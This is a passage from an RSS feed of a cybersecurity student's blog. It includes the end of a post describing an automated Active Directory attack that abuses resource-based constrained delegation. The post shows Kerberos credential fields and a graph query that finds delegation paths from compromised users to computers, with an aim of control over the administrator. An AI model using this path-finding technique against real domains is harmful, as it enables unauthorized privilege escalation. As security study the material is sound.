&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kerb&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;: password,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_hash&amp;#34;&lt;/span&gt;: hash_,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aeskey&amp;#34;&lt;/span&gt;: aeskey
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The script would add a new computer to the domain and then modify its permissions to have control over an object it can delegate to like the administrator user. All of it is automated by the script running a query to get possible RBCD paths to users. The query:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;MATCH&lt;/span&gt; path1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(n &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;t: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[ &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ALLSHORTEST (r, n &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;(m)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; m.disabled &lt;span style=&#34;color:#66d9ef&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; m.t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;computer&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; n.disabled &lt;span style=&#34;color:#66d9ef&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; n.pwned &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;True&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; m.pwned &lt;span style=&#34;color:#66d9ef&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; m.added_comp &lt;span style=&#34;color:#66d9ef&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; m.name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;randomcomputer550$&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ALL&lt;/span&gt;(rel &lt;span style=&#34;color:#66d9ef&#34;&gt;IN&lt;/span&gt; relationships(path1) &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt;(rel) &lt;span style=&#34;color:#66d9ef&#34;&gt;IN&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memberOf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GENERIC_ALL&amp;#34;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;size&lt;/span&gt;(relationships(path1)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RETURN&lt;/span&gt; path1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;More coming soon on this post&amp;hellip;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Hello</title>
      <link>//localhost:1313/posts/hello/</link>
      <pubDate>Fri, 08 Nov 2024 23:55:59 -0700</pubDate>
      
      <guid>//localhost:1313/posts/hello/</guid>
      <description>&lt;h2 id=&#34;hello-world&#34;&gt;Hello World!!&lt;/h2&gt;</description>
      <content>&lt;h2 id=&#34;hello-world&#34;&gt;Hello World!!&lt;/h2&gt;
</content>
    </item>
    
    <item>
      <title></title>
      <link>//localhost:1313/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/about/</guid>
      <description>&lt;h1 id=&#34;about-me&#34;&gt;About Me&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/avatar.png&#34; alt=&#34;&#34;&gt;
Hello World! I am Ceald, a cybersecurity student, I like heavy music and build cool tools/projects sometimes. I know python and a bit of Golang&lt;/p&gt;</description>
      <content>&lt;h1 id=&#34;about-me&#34;&gt;About Me&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/avatar.png&#34; alt=&#34;&#34;&gt;
Hello World! I am Ceald, a cybersecurity student, I like heavy music and build cool tools/projects sometimes. I know python and a bit of Golang&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
